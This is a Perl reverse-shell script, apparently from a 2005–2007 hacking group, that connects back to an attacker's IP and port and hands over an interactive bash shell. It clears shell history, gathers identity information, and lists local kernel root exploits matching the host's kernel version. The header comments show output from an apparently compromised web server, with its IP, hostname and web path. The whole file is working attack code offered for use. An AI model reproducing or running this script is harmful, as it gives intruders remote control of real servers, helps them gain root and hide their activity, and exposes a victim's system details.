#!/usr/bin/perl
# anonyph; arp; ka0x; xarnuz
# 2005 - 2007
# BackConnectShell + Rootlab t00l
# priv8!
# 3sk0rbut0@gmail.com
# r00t l4b by D.O.M
# ka0x:~/Desktop # ./nc -lvvp 8600
# listening on [any] 8600 ...
# 66.232.128.123: inverse host lookup failed: h_errno 11004: NO_DATA
# connect to [00.00.00.00] from (UNKNOWN) [66.232.128.123] 40444: NO_DATA

# ******* ConnectBack Shell *******

# Linux version 2.6.9-022stab078.14-smp (root@kern268.build.sw.ru) (gcc version 3.
# 3.3 20040412 (Red Hat Linux 3.3.3-7)) #1 SMP Wed Jul 19 14:26:20 MSD 2006
# apache
# uid=48(apache) gid=48(apache) groups=48(apache),500(webadmin),2523(psaserv)
# /home/httpd/vhosts/holler.co.uk/httpdocs/datatest

# Kernel local:
# Linux bowden4585.vps.securepod.com 2.6.9-022stab078.14-smp #1 SMP Wed Jul 19 14
# :26:20 MSD 2006 i686 i686 i386 GNU/Linux

# P0sible 3xploit: exp.sh
# P0sible 3xploit: krad3
# P0sible 3xploit: newsmp
# P0sible 3xploit: ptrace_kmod
# P0sible 3xploit: py2
# P0sible 3xploit: ong_bak
# P0sible 3xploit: prctl3
# P0sible 3xploit: prctl
# P0sible 3xploit: kmdx
# P0sible 3xploit: pwned
#
# sh: no job control in this shell
# sh-2.05b$

use IO::Socket;     
use Socket;
use FileHandle;
 
  $system   = '/bin/bash';
if(!$ARGV[0])
      {
print "\nBackConnect Shell - D.O.M TEAM\n\n";
print "Usage: perl $0 [IPHOST] [NCPORT]\n";
print "Example: perl $0 82.85.55.21 6850\n\n";
  exit;
}

  socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) ||
        die print "[-] Protocolo Desconocido\n";
    connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) ||
            die print "[-] Error Socket\n";
print "[+] BackConnect Shell\n";
print "[+] Conectando a $ARGV[0]... \n";
print "[+] Enviando Shell... \n";
print "[+] Conectado. \n";
        SOCKET->autoflush();
                  open(STDIN, ">&SOCKET");
            open(STDOUT,">&SOCKET");
       open(STDERR,">&SOCKET");
print "\n******* ConnectBack Shell *******\n\n";
  system("unset HISTFILE;unset SAVEHIST ;cat /proc/version;whoami;id;who;pwd");

# Rootkernel

my $khost = `uname -r`;
chomp($khost);
print "\nKernel local: $khost\n\n";

my %h;
$h{'w00t'} = { vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] };
$h{'brk'} = { vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] };
$h{'ave'} = { vuln=>['2.4.19','2.4.20'] };
$h{'elflbl'} = { vuln=>['2.4.29'] };
$h{'elfdump'} = { vuln=>['2.4.27'] };
$h{'expand_stack'} = { vuln=>['2.4.29'] };
$h{'h00lyshit'} = { vuln=>['2.6.8','2.6.10','2.6.11','2.6.12'] };
$h{'kdump'} = { vuln=>['2.6.13'] };
$h{'km2'} = { vuln=>['2.4.18','2.4.22'] };
$h{'krad'} = { vuln=>['2.6.11'] };
$h{'krad3'} = { vuln=>['2.6.11','2.6.9'] };
$h{'local26'} = { vuln=>['2.6.13'] };
$h{'loko'} = { vuln=>['2.4.22','2.4.23','2.4.24'] };
$h{'mremap_pte'} = { vuln=>['2.4.20','2.2.25','2.4.24'] };
$h{'newlocal'} = { vuln=>['2.4.17','2.4.19'] };
$h{'ong_bak'} = { vuln=>['2.4.','2.6.'] };
$h{'ptrace'} = { vuln=>['2.2.24','2.4.22'] };
$h{'ptrace_kmod'} = { vuln=>['2.4.','2.6.'] };
$h{'ptrace24'} = { vuln=>['2.4.9'] };
$h{'pwned'} = { vuln=>['2.4.','2.6.'] };
$h{'py2'} = { vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] };
$h{'raptor_prctl'} = { vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] };
$h{'prctl3'} = { vuln=>['2.6.13','2.6.17','2.6.9'] };
$h{'remap'} = { vuln=>['2.4.'] };
$h{'rip'} = { vuln=>['2.2.'] };
$h{'stackgrow2'} = { vuln=>['2.4.29','2.6.10'] };
$h{'uselib24'} = { vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] };
$h{'newsmp'} = { vuln=>['2.6.'] };
$h{'smpracer'} = { vuln=>['2.4.29'] };
$h{'loginx'} = { vuln=>['2.4.22'] };
$h{'exp.sh'} = { vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] };
$h{'prctl'} = { vuln=>['2.6.'] };
$h{'kmdx'} = { vuln=>['2.6.','2.4.'] };

&busca;
sub busca {
foreach my $key(keys %h){

foreach my $kernel ( @{ $h{$key}{'vuln'} } ){
   
     if($khost=~/^$kernel/){
         chop($kernel) if ($kernel=~/.$/);
         print "P0sible 3xploit: ". $key ."\n";
         }
      }
   }
}
print "\n\n\n";
system 'export TERM=xterm;exec sh -i';
system($system);


__END__ 